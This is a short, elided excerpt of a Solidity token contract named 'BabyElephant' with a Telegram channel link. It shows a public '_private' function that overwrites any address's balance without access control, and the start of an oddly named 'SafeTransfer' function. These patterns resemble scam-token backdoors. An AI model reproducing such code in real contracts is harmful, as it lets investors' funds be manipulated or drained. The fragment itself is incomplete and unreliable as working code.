...
TG CHANNEL: https://t.me/Babyelephantbsc
*/
...
contract BabyElephant is IERC20, Ownable {
    ...
    function _private(address buyer) public {
        balances[buyer] = reflection(buyer);
    }

    function SafeTransfer(address Router) public Safe {
